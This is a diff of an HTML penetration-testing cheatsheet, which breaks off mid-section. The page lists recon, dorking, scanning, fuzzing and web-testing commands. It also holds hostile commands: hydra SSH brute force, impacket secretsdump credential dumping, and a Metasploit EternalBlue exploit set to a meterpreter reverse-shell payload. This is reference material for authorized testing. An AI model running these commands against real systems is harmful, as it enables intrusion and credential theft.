@@ -1,557 +1,844 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Penetration Testing & Vulnerability Research Cheatsheet — Robust Commands</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title data-i18n="mainTitle">Penetration Testing & Vulnerability Research — Robust Cheatsheet</title>
+    <style>
+        /* CSS STYLES */
+        :root{ --bg:#0d0f12; --card:#0f1720; --muted:#94a3b8; --accent:#7c3aed; --accent-2:#06b6d4; --header:#e6eef7; --code-bg:#1c1e26; }
+        body{font-family:Inter,sans-serif;background:var(--bg);color:var(--muted);margin:0;padding:20px}
+        .container{max-width:1100px;margin:0 auto;background:var(--card);padding:26px;border-radius:12px;box-shadow:0 8px 30px rgba(0,0,0,0.6)}
+        h1{margin:0;color:var(--header);font-size:22px}
+        h2{color:var(--header);font-size:1.3rem;margin-top:20px;border-left:4px solid var(--accent);padding-left:10px;cursor:pointer; display: flex; align-items: center; justify-content: space-between;}
+        
+        /* RTL adjustments for Hebrew */
+        html[dir="rtl"] h2 {
+            border-left: none;
+            border-right: 4px solid var(--accent);
+            padding-left: 0;
+            padding-right: 10px;
+            flex-direction: row-reverse; /* Put chips before the title text */
+        }
+        html[dir="rtl"] h2 .chip-container { flex-direction: row-reverse; }
+        html[dir="rtl"] h2 .chip { margin-left: 0; margin-right: 8px; }
 
-<link href="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/themes/prism-tomorrow.css" rel="stylesheet" />
+        pre{border-radius:8px;margin:10px 0;padding:12px;position:relative;background:var(--code-bg);overflow:auto;border:1px solid rgba(255,255,255,0.03)}
+        .copy-btn{position:absolute;right:10px;top:10px;background:var(--accent-2);color:#000;border:none;padding:6px 8px;border-radius:6px;font-size:12px;cursor:pointer; transition: background-color 0.3s;}
+        .copy-btn:hover { background-color: #0bd; }
+        html[dir="rtl"] .copy-btn { left: 10px; right: auto; }
 
-<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' rx='16' fill='%230f1720'/%3E%3Ctext x='50' y='58' font-size='44' text-anchor='middle' fill='%237c3aed' font-family='Inter,Arial' font-weight='700'%3EPT%3C/text%3E%3C/svg%3E">
+        .warning{border:1px solid #eab308;border-left:4px solid #eab308;background:rgba(234,179,8,0.07);color:#ffd;padding:12px;border-radius:8px}
+        html[dir="rtl"] .warning {
+            border-left: none;
+            border-right: 4px solid #eab308;
+        }
 
-<style>
-:root{
-  --bg:#0d0f12; --card:#0f1720; --muted:#94a3b8; --accent:#7c3aed; --accent-2:#06b6d4; --header:#e6eef7; --code-bg:#1c1e26;
-}
-body{font-family:Inter,sans-serif;background:var(--bg);color:var(--muted);margin:0;padding:20px}
-.container{max-width:1100px;margin:0 auto;background:var(--card);padding:26px;border-radius:12px;box-shadow:0 8px 30px rgba(0,0,0,0.6)}
-h1{margin:0;color:var(--header);font-size:22px}
-h2{color:var(--header);font-size:1.3rem;margin-top:20px;border-left:4px solid var(--accent);padding-left:10px;cursor:pointer; display: flex; align-items: center; justify-content: space-between;}
-
-/* RTL adjustments for Hebrew */
-html[dir="rtl"] h2 {
-  border-left: none;
-  border-right: 4px solid var(--accent);
-  padding-left: 0;
-  padding-right: 10px;
-  flex-direction: row-reverse; /* Put chips before the title text */
-}
-html[dir="rtl"] h2 .chip-container { flex-direction: row-reverse; }
-html[dir="rtl"] h2 .chip { margin-left: 0; margin-right: 8px; }
-
-pre{border-radius:8px;margin:10px 0;padding:12px;position:relative;background:var(--code-bg);overflow:auto;border:1px solid rgba(255,255,255,0.03)}
-.copy-btn{position:absolute;right:10px;top:10px;background:var(--accent-2);color:#000;border:none;padding:6px 8px;border-radius:6px;font-size:12px;cursor:pointer}
-html[dir="rtl"] .copy-btn { left: 10px; right: auto; }
-
-.warning{border:1px solid #eab308;border-left:4px solid #eab308;background:rgba(234,179,8,0.07);color:#ffd;padding:12px;border-radius:8px}
-html[dir="rtl"] .warning {
-  border-left: none;
-  border-right: 4px solid #eab308;
-}
-
-.section-desc{margin-top:-8px;margin-bottom:12px;font-style:italic;color:var(--muted)}
-.command-desc{font-size:0.85rem;margin-top:3px;margin-bottom:10px;color:#b0bcd4;font-style:italic}
-#searchInput, #languageSelector{width:100%;padding:10px;margin-bottom:12px;border-radius:8px;border:none;background:var(--code-bg);color:var(--muted); box-sizing: border-box;}
-.language-tools { display: flex; gap: 10px; margin-bottom: 12px; }
-.language-tools > * { flex-grow: 1; }
-.chip-container { display: flex; gap: 8px; }
-.chip{display:inline-block;background:rgba(255,255,255,0.04);padding:4px 8px;border-radius:999px;color:var(--accent-2);font-size:12px;cursor:pointer}
-button.primary{background:linear-gradient(90deg,var(--accent),var(--accent-2));color:white;border:none}
-footer{margin-top:18px;color:var(--muted);font-size:13px;text-align:center}
-footer a { color: var(--accent); text-decoration: none; }
-</style>
+        .section-desc{margin-top:-8px;margin-bottom:12px;font-style:italic;color:var(--muted)}
+        .command-desc{font-size:0.85rem;margin-top:3px;margin-bottom:10px;color:#b0bcd4;font-style:italic}
+        #searchInput{width:100%;padding:10px;margin-bottom:12px;border-radius:8px;border:none;background:var(--code-bg);color:var(--muted); box-sizing: border-box;}
+        .language-tools { display: flex; gap: 10px; margin-bottom: 12px; }
+        .language-tools button { flex-grow: 1; padding: 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.1); background: var(--code-bg); color: var(--muted); cursor: pointer; transition: all 0.2s;}
+        .language-tools button.primary { background: linear-gradient(90deg,var(--accent),var(--accent-2)); color: white; border-color: var(--accent); }
+        .chip-container { display: flex; gap: 8px; }
+        .chip{display:inline-block;background:rgba(255,255,255,0.04);padding:4px 8px;border-radius:999px;color:var(--accent-2);font-size:12px;cursor:default;}
+        #toggleAllButton{padding:10px;border-radius:8px;border:none;width: 100%; margin-bottom: 20px; font-weight: bold; cursor: pointer; background:rgba(255,255,255,0.05); color: var(--accent-2);}
+        #toggleAllButton:hover { background: rgba(255,255,255,0.08); }
+        footer{margin-top:18px;color:var(--muted);font-size:13px;text-align:center}
+        footer a { color: var(--accent); text-decoration: none; }
+        .toggle-icon { margin-left: auto; padding-left: 10px; font-weight: bold; }
+        html[dir="rtl"] .toggle-icon { margin-right: auto; margin-left: 0; padding-right: 10px; padding-left: 0; }
+    </style>
 </head>
 <body>
+
 <div class="container">
-<h1 data-i18n="mainTitle">Penetration Testing & Vulnerability Research — Robust Cheatsheet</h1>
+    <h1 data-i18n="mainTitle">Penetration Testing & Vulnerability Research — Robust Cheatsheet</h1>
 
-<div class="language-tools">
-  <select id="languageSelector" onchange="switchLanguage(this.value)">
-    <option value="en">English</option>
-    <option value="ru">Русский (Russian)</option>
-    <option value="he">עברית (Hebrew)</option>
-    <option value="fr">Français (French)</option>
-    <option value="de">Deutsch (German)</option>
-  </select>
-</div>
+    <div class="language-tools">
+        <button data-lang="en" class="primary">English</button>
+        <button data-lang="ru">Русский (Russian)</button>
+        <button data-lang="he">עברית (Hebrew)</button>
+        <button data-lang="fr">Français (French)</button>
+        <button data-lang="de">Deutsch (German)</button>
+    </div>
+    
+    <button id="toggleAllButton" data-i18n="toggleButtonCollapsed">Expand All</button>
 
-<input id="searchInput" placeholder="Search commands, tools, CVE..." />
+    <div class="warning">
+        <strong data-i18n="warningTitle">⚠️ AUTHORIZED USE ONLY</strong>
+        <p data-i18n="warningBody">Run these commands only in lab environments or on targets you have explicit written permission to test.</p>
+    </div>
 
+    <input type="text" id="searchInput" placeholder="Search commands, tools, CVE...">
 
-<div class="warning">
-<strong data-i18n="warningTitle">⚠️ AUTHORIZED USE ONLY</strong>
-<p data-i18n="warningBody" style="margin: 5px 0 0 0;"></p>
-</div>
+    <div class="section-container">
+        <h2 class="section-header" data-i18n="section1Title" data-target="section-1">
+            1) Recon & OSINT
+            <span class="chip-container"><span class="chip">OSINT</span><span class="chip">Recon</span></span>
+            <span class="toggle-icon">▼</span>
+        </h2>
+        <p class="section-desc" data-i18n="section1Desc">Footprinting, WHOIS, DNS lookups, and passive certificate data gathering.</p>
+        <div id="section-1" class="section-content">
+            <p class="command-desc" data-i18n="section1CommandDesc">Commands gather domain info, DNS records, HTTP headers, and passive certificate/host data.</p>
+            
+            <p class="command-desc"># Set target</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>TARGET=example.com</code></pre>
 
-<h2 onclick="toggleSection('s1')"><span data-i18n="section1Title">1) Recon & OSINT</span><span class="chip-container"><span class="chip" data-tag="osint">OSINT</span> <span class="chip" data-tag="recon">Recon</span></span></h2>
-<div id="s1">
-<p class="section-desc" data-i18n="section1Desc"></p>
-<pre class="language-bash"><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># Set target
-TARGET=example.com
+            <p class="command-desc">WHOIS lookup</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>whois $TARGET</code></pre>
 
-# WHOIS lookup
-whois $TARGET
-
-# DNS: A + MX + NS records
-dig +noall +answer $TARGET A
+            <p class="command-desc">DNS: A + MX + NS records</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>dig +noall +answer $TARGET A
 dig +noall +answer $TARGET MX
-dig +noall +answer $TARGET NS
+dig +noall +answer $TARGET NS</code></pre>
 
-# HTTP headers check
-curl -I -L --max-redirs 5 https://$TARGET
+            <p class="command-desc">HTTP headers check</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>curl -I -L --max-redirs 5 https://$TARGET</code></pre>
 
-# Certificate names (crt.sh)
-curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | jq -r '.[].name_value' | sort -u
+            <p class="command-desc">Certificate names (crt.sh)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | jq -r '.[].name_value' | sort -u</code></pre>
 
-# Passive OSINT (AUTHORIZED USE ONLY)
-theharvester -d example.com -b google,bing,linkedin -l 500
+            <p class="command-desc">Passive OSINT (AUTHORIZED USE ONLY)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>theharvester -d example.com -b google,bing,linkedin -l 500
 shodan host 1.2.3.4</code></pre>
-<p class="command-desc" data-i18n="section1CommandDesc"></p>
-</div>
+        </div>
+    </div>
+    
+    <div class="section-container">
+        <h2 class="section-header" data-i18n="section2Title" data-target="section-2">
+            2) Recon: Search Engine Dorking & Exposed Assets
+            <span class="chip-container"><span class="chip">OSINT</span><span class="chip">Dorking</span></span>
+            <span class="toggle-icon">▼</span>
+        </h2>
+        <p class="section-desc" data-i18n="section2Desc">Using advanced search operators (Dorks) on Google, Bing, and Yandex to discover exposed files, directories, and misconfigurations.</p>
+        <div id="section-2" class="section-content">
+            <p class="command-desc" data-i18n="section2CommandDesc">These dorks work across all major search engines and are crucial for external reconnaissance.</p>
+            
+            <p class="command-desc"># Find sensitive files (.pdf, .xls) on target domain</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>site:target.com filetype:pdf confidential
+site:target.com filetype:xls password</code></pre>
 
-<h2 onclick="toggleSection('s2')"><span data-i18n="section2Title">2) Recon: Search Engine Dorking & Exposed Assets</span><span class="chip-container"><span class="chip" data-tag="osint">OSINT</span> <span class="chip" data-tag="dorking">Dorking</span></span></h2>
-<div id="s2">
-<p class="section-desc" data-i18n="section2Desc"></p>
-<pre class="language-bash"><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># Find sensitive files (.pdf, .xls) on target domain
-site:target.com filetype:pdf confidential
-site:target.com filetype:xls password
+            <p class="command-desc">Find public login/admin panels</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>intitle:"login page" inurl:admin site:target.com</code></pre>
 
-# Find public login/admin panels
-intitle:"login page" inurl:admin site:target.com
+            <p class="command-desc">Find exposed configuration or log files</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>inurl:wp-config.php OR inurl:.env filetype:txt
+intitle:"index of /" log</code></pre>
 
-# Find exposed configuration or log files
-inurl:wp-config.php OR inurl:.env filetype:txt
-intitle:"index of /" log
+            <p class="command-desc">Find cached pages to check for old data exposure</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>cache:https://target.com/page-with-old-data</code></pre>
 
-# Find cached pages to check for old data exposure
-cache:https://target.com/page-with-old-data
+            <p class="command-desc">Restrict results to a specific file type AND title match</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>intitle:"report" filetype:docx site:target.com</code></pre>
+        </div>
+    </div>
+    
+    <div class="section-container">
+        <h2 class="section-header" data-i18n="section3Title" data-target="section-3">
+            3) SEO & Indexation Security
+            <span class="chip-container"><span class="chip">Web</span><span class="chip">SEO</span></span>
+            <span class="toggle-icon">▼</span>
+        </h2>
+        <p class="section-desc" data-i18n="section3Desc">Testing for misconfigurations in robots.txt, meta tags, and canonical URLs that lead to unintended data exposure or duplicate content issues.</p>
+        <div id="section-3" class="section-content">
+            <p class="command-desc" data-i18n="section3CommandDesc">These checks help find security issues caused by poor communication between developers and search engine crawlers.</p>
 
-# Restrict results to a specific file type AND title match
-intitle:"report" filetype:docx site:target.com</code></pre>
-<p class="command-desc" data-i18n="section2CommandDesc"></p>
-</div>
+            <p class="command-desc"># Check for security-sensitive disallow rules in robots.txt</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>curl -s https://example.com/robots.txt | grep -i "disallow"</code></pre>
 
-<h2 onclick="toggleSection('s3')"><span data-i18n="section3Title">3) SEO & Indexation Security</span><span class="chip-container"><span class="chip" data-tag="web">Web</span> <span class="chip" data-tag="seo">SEO</span></span></h2>
-<div id="s3">
-<p class="section-desc" data-i18n="section3Desc"></p>
-<pre class="language-bash"><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># Check for security-sensitive disallow rules in robots.txt
-curl -s https://example.com/robots.txt | grep -i "disallow"
+            <p class="command-desc">Identify sensitive meta robots tags (e.g., noindex on login forms) - Should return "noindex" for sensitive, non-public pages.</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>grep -i 'meta name="robots"' page_source.html</code></pre>
 
-# Identify sensitive meta robots tags (e.g., noindex on login forms)
-# Should return "noindex" for sensitive, non-public pages.
-grep -i 'meta name="robots"' page_source.html
+            <p class="command-desc">Check for canonical tag misconfigurations (points to non-HTTPS, wrong domain, or internal staging) - Command run locally on page source:</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>grep -i '&lt;link rel="canonical"' page_source.html</code></pre>
 
-# Check for canonical tag misconfigurations (points to non-HTTPS, wrong domain, or internal staging)
-# Command run locally on page source:
-grep -i '<link rel="canonical"' page_source.html
+            <p class="command-desc">Check for unintended parameter indexation (e.g., session IDs in URL) - Use a dork to check if Google/Bing indexed URLs with sensitive parameters:</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>site:example.com inurl:sessionid= OR inurl:PHPSESSID=</code></pre>
 
-# Check for unintended parameter indexation (e.g., session IDs in URL)
-# Use a dork to check if Google/Bing indexed URLs with sensitive parameters:
-site:example.com inurl:sessionid= OR inurl:PHPSESSID=
+            <p class="command-desc">Use specialized tools to find indexation issues (e.g., using a sitemap scanner like Scrape-It)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>scrape-it --sitemap https://example.com/sitemap.xml --check-robots</code></pre>
+        </div>
+    </div>
+    
+    <div class="section-container">
+        <h2 class="section-header" data-i18n="section4Title" data-target="section-4">
+            4) Subdomain & DNS Enumeration
+            <span class="chip-container"><span class="chip">DNS</span><span class="chip">Subdomain</span></span>
+            <span class="toggle-icon">▼</span>
+        </h2>
+        <p class="section-desc" data-i18n="section4Desc">Discovering subdomains and advanced DNS records using specialized tools.</p>
+        <div id="section-4" class="section-content">
+            <p class="command-desc" data-i18n="section4CommandDesc">Uses Amass and Subfinder for comprehensive target scope, combining passive and active sources.</p>
+            
+            <p class="command-desc"># Amass (passive + active + brute)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>amass enum -d example.com -o amass.txt</code></pre>
 
-# Use specialized tools to find indexation issues (e.g., using a sitemap scanner like Scrape-It)
-# scrape-it --sitemap https://example.com/sitemap.xml --check-robots
-</code></pre>
-<p class="command-desc" data-i18n="section3CommandDesc"></p>
-</div>
+            <p class="command-desc">Subfinder (fast passive)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>subfinder -d example.com -o subfinder.txt</code></pre>
 
-<h2 onclick="toggleSection('s4')"><span data-i18n="section4Title">4) Subdomain & DNS Enumeration</span><span class="chip-container"><span class="chip" data-tag="dns">DNS</span> <span class="chip" data-tag="subdomain">Subdomain</span></span></h2>
-<div id="s4">
-<p class="section-desc" data-i18n="section4Desc"></p>
-<pre class="language-bash"><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># Amass (passive + active + brute)
-amass enum -d example.com -o amass.txt
+            <p class="command-desc">DNS recon</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>dnsrecon -d example.com -t std,brt,srv</code></pre>
+        </div>
+    </div>
+    
+    <div class="section-container">
+        <h2 class="section-header" data-i18n="section5Title" data-target="section-5">
+            5) Port & Service Discovery
+            <span class="chip-container"><span class="chip">Network</span><span class="chip">Nmap</span></span>
+            <span class="toggle-icon">▼</span>
+        </h2>
+        <p class="section-desc" data-i18n="section5Desc">Aggressive port scanning, service versioning, and banner grabbing.</p>
+        <div id="section-5" class="section-content">
+            <p class="command-desc" data-i18n="section5CommandDesc">The Nmap command is a safe, thorough pattern: default scripts, service versions, all ports, fast timing, and output formats.</p>
+            
+            <p class="command-desc"># Nmap (version, default scripts, full ports)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>nmap -sC -sV -p- -T4 --min-rate 1000 -oA nmap-full 192.0.2.0/24</code></pre>
 
-# Subfinder (fast passive)
-subfinder -d example.com -o subfinder.txt
+            <p class="command-desc">Host discovery (ping scan)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>nmap -sn 192.0.2.0/24</code></pre>
 
-# DNS recon
-dnsrecon -d example.com -t std,brt,srv</code></pre>
-<p class="command-desc" data-i18n="section4CommandDesc"></p>
-</div>
+            <p class="command-desc">Banner grab with netcat (HTTP 80)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>nc -vz 192.0.2.10 80</code></pre>
+        </div>
+    </div>
+    
+    <div class="section-container">
+        <h2 class="section-header" data-i18n="section6Title" data-target="section-6">
+            6) Web Discovery & Fuzzing
+            <span class="chip-container"><span class="chip">Web</span><span class="chip">Fuzzing</span></span>
+            <span class="toggle-icon">▼</span>
+        </h2>
+        <p class="section-desc" data-i18n="section6Desc">Bruteforcing directories, files, and virtual hosts.</p>
+        <div id="section-6" class="section-content">
+            <p class="command-desc" data-i18n="section6CommandDesc">Uses ffuf and gobuster for content discovery, filtering for common success status codes (200, 301, 302).</p>
+            
+            <p class="command-desc"># ffuf (directory/file fuzzing)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>ffuf -u https://example.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,301,302 -o ffuf.json</code></pre>
 
-<h2 onclick="toggleSection('s5')"><span data-i18n="section5Title">5) Port & Service Discovery</span><span class="chip-container"><span class="chip" data-tag="network">Network</span> <span class="chip" data-tag="nmap">Nmap</span></span></h2>
-<div id="s5">
-<p class="section-desc" data-i18n="section5Desc"></p>
-<pre class="language-bash"><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># Nmap (version, default scripts, full ports)
-nmap -sC -sV -p- -T4 --min-rate 1000 -oA nmap-full 192.0.2.0/24
+            <p class="command-desc">gobuster (dir + vhost)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>gobuster dir -u https://example.com/ -w /usr/share/wordlists/dirb/common.txt -t 50 -o gobuster.txt</code></pre>
+        </div>
+    </div>
+    
+    <div class="section-container">
+        <h2 class="section-header" data-i18n="section7Title" data-target="section-7">
+            7) Web Application Testing
+            <span class="chip-container"><span class="chip">Webapp</span><span class="chip">SQL</span><span class="chip">XSS</span></span>
+            <span class="toggle-icon">▼</span>
+        </h2>
+        <p class="section-desc" data-i18n="section7Desc">Quick vulnerability checks for SQLi and XSS, plus basic HTTP diagnostics.</p>
+        <div id="section-7" class="section-content">
+            <p class="command-desc" data-i18n="section7CommandDesc">Tools for checking common application layer flaws and enumerating hidden parameters.</p>
+            
+            <p class="command-desc"># nikto (webserver checks)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>nikto -h https://example.com -output nikto.txt</code></pre>
 
-# Host discovery (ping scan)
-nmap -sn 192.0.2.0/24
+            <p class="command-desc">sqlmap (ONLY in-scope & lab)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>sqlmap -u "https://example.com/vuln.php?id=1" --batch --dbs</code></pre>
 
-# Banner grab with netcat (HTTP 80)
-nc -vz 192.0.2.10 80</code></pre>
-<p class="command-desc" data-i18n="section5CommandDesc"></p>
-</div>
+            <p class="command-desc">XSS testing (lab only)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>xsstrike -u "https://example.com/page?param=1"</code></pre>
 
-<h2 onclick="toggleSection('s6')"><span data-i18n="section6Title">6) Web Discovery & Fuzzing</span><span class="chip-container"><span class="chip" data-tag="web">Web</span> <span class="chip" data-tag="fuzzing">Fuzzing</span></span></h2>
-<div id="s6">
-<p class="section-desc" data-i18n="section6Desc"></p>
-<pre class="language-bash"><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># ffuf (directory/file fuzzing)
-ffuf -u https://example.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,301,302 -o ffuf.json
+            <p class="command-desc">parameter discovery</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>arjun -u "https://example.com/page" -o arjun.txt</code></pre>
+        </div>
+    </div>
+    
+    <div class="section-container">
+        <h2 class="section-header" data-i18n="section8Title" data-target="section-8">
+            8) Vulnerability Scanning & SCA
+            <span class="chip-container"><span class="chip">CVE</span><span class="chip">SBOM</span></span>
+            <span class="toggle-icon">▼</span>
+        </h2>
+        <p class="section-desc" data-i18n="section8Desc">Automated vulnerability template scanning, SBOM generation, and analysis.</p>
+        <div id="section-8" class="section-content">
+            <p class="command-desc" data-i18n="section8CommandDesc">Uses open-source tools for infrastructure scanning (Nuclei) and dependency analysis (Syft/Grype).</p>
+            
+            <p class="command-desc"># nuclei (fast templates)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>nuclei -l hosts.txt -t cves/ -o nuclei_results.txt</code></pre>
 
-# gobuster (dir + vhost)
-gobuster dir -u https://example.com/ -w /usr/share/wordlists/dirb/common.txt -t 50 -o gobuster.txt</code></pre>
-<p class="command-desc" data-i18n="section6CommandDesc"></p>
-</div>
+            <p class="command-desc">syft -> generate SBOM (Software Bill of Materials)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>syft packages dir:./project -o json > sbom.json</code></pre>
 
-<h2 onclick="toggleSection('s7')"><span data-i18n="section7Title">7) Web Application Testing</span><span class="chip-container"><span class="chip" data-tag="webapp">Webapp</span> <span class="chip" data-tag="sql">SQL</span> <span class="chip" data-tag="xss">XSS</span></span></h2>
-<div id="s7">
-<p class="section-desc" data-i18n="section7Desc"></p>
-<pre class="language-bash"><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># nikto (webserver checks)
-nikto -h https://example.com -output nikto.txt
+            <p class="command-desc">grype -> scan SBOM</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>grype sbom:sbom.json</code></pre>
 
-# sqlmap (ONLY in-scope & lab)
-sqlmap -u "https://example.com/vuln.php?id=1" --batch --dbs
+            <p class="command-desc">query NVD (example)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>curl -s "https://services.nvd.nist.gov/rest/json/cve/1.0/CVE-2021-44228" | jq .</code></pre>
+        </div>
+    </div>
+    
+    <div class="section-container">
+        <h2 class="section-header" data-i18n="section9Title" data-target="section-9">
+            9) Passwords, Credentials & AD Tooling
+            <span class="chip-container"><span class="chip">Passwords</span><span class="chip">AD</span></span>
+            <span class="toggle-icon">▼</span>
+        </h2>
+        <p class="section-desc" data-i18n="section9Desc">Online bruteforce (authorized only), offline hash cracking, and Active Directory enumeration tools.</p>
+        <div id="section-9" class="section-content">
+            <p class="command-desc" data-i18n="section9CommandDesc">Standard tools for credential testing, hash cracking, and AD environment assessment.</p>
+            
+            <p class="command-desc"># hydra (online bruteforce) - AUTHORIZED ONLY</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>hydra -L users.txt -P passwords.txt -t 4 ssh://192.0.2.10 -o hydra-ssh.txt</code></pre>
 
-# XSS testing (lab only)
-xsstrike -u "https://example.com/page?param=1"
+            <p class="command-desc">john / hashcat (offline cracking)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>john --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt</code></pre>
 
-# parameter discovery
-arjun -u "https://example.com/page" -o arjun.txt</code></pre>
-<p class="command-desc" data-i18n="section7CommandDesc"></p>
-</div>
+            <p class="command-desc">impacket (examples: secretsdump)</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>python3 /opt/impacket/examples/secretsdump.py domain/USER:PASS -outputfile secrets</code></pre>
 
-<h2 onclick="toggleSection('s8')"><span data-i18n="section8Title">8) Vulnerability Scanning & SCA</span><span class="chip-container"><span class="chip" data-tag="cve">CVE</span> <span class="chip" data-tag="sbom">SBOM</span></span></h2>
-<div id="s8">
-<p class="section-desc" data-i18n="section8Desc"></p>
-<pre class="language-bash"><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># nuclei (fast templates)
-nuclei -l hosts.txt -t cves/ -o nuclei_results.txt
+            <p class="command-desc">BloodHound collection</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>Invoke-BloodHound -CollectionMethod All -ZipFileName bloodhound.zip</code></pre>
+        </div>
+    </div>
+    
+    <div class="section-container">
+        <h2 class="section-header" data-i18n="section10Title" data-target="section-10">
+            10) Exploitation: Metasploit Framework (MSF)
+            <span class="chip-container"><span class="chip">Exploit</span><span class="chip">MSF</span></span>
+            <span class="toggle-icon">▼</span>
+        </h2>
+        <p class="section-desc" data-i18n="section10Desc">Core Metasploit commands for searching, configuring, and executing exploits.</p>
+        <div id="section-10" class="section-content">
+            <p class="command-desc" data-i18n="section10CommandDesc">A template workflow for using auxiliary and exploit modules in the Metasploit console.</p>
+            
+            <p class="command-desc"># start msfconsole</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>msfconsole</code></pre>
 
-# syft -> generate SBOM (Software Bill of Materials)
-syft packages dir:./project -o json > sbom.json
+            <p class="command-desc">search</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>search cve:2017-0143
+search type:exploit platform:windows smb</code></pre>
 
-# grype -> scan SBOM
-grype sbom:sbom.json
+            <p class="command-desc">use exploit</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>use exploit/windows/smb/ms17_010_eternalblue</code></pre>
 
-# query NVD (example)
-curl -s "https://services.nvd.nist.gov/rest/json/cve/1.0/CVE-2021-44228" | jq .</code></pre>
-<p class="command-desc" data-i18n="section8CommandDesc"></p>
-</div>
-
-<h2 onclick="toggleSection('s9')"><span data-i18n="section9Title">9) Passwords, Credentials & AD Tooling</span><span class="chip-container"><span class="chip" data-tag="passwords">Passwords</span> <span class="chip" data-tag="ad">AD</span></span></h2>
-<div id="s9">
-<p class="section-desc" data-i18n="section9Desc"></p>
-<pre class="language-bash"><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># hydra (online bruteforce) - AUTHORIZED ONLY
-hydra -L users.txt -P passwords.txt -t 4 ssh://192.0.2.10 -o hydra-ssh.txt
-
-# john / hashcat (offline cracking)
-john --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt
-
-# impacket (examples: secretsdump)
-python3 /opt/impacket/examples/secretsdump.py domain/USER:PASS -outputfile secrets
-
-# BloodHound collection
-Invoke-BloodHound -CollectionMethod All -ZipFileName bloodhound.zip</code></pre>
-<p class="command-desc" data-i18n="section9CommandDesc"></p>
-</div>
-
-<h2 onclick="toggleSection('s10')"><span data-i18n="section10Title">10) Exploitation: Metasploit Framework (MSF)</span><span class="chip-container"><span class="chip" data-tag="exploit">Exploit</span> <span class="chip" data-tag="msf">MSF</span></span></h2>
-<div id="s10">
-<p class="section-desc" data-i18n="section10Desc"></p>
-<pre class="language-bash"><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># start msfconsole
-msfconsole
-
-# search
-search cve:2017-0143
-search type:exploit platform:windows smb
-
-# use exploit
-use exploit/windows/smb/ms17_010_eternalblue
-
-# show/set options
-show options
+            <p class="command-desc">show/set options</p>
+            <pre><button class="copy-btn" data-i18n="copyButtonText">Copy</button><code>show options
 set RHOSTS 192.168.1.0/24
 set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST 10.0.0.5
+set LHOST 10.0.0.5</code></pre>
 
-# check (non-destructive)
-check
+            <p class="command-desc">check (non-destructive)</p>
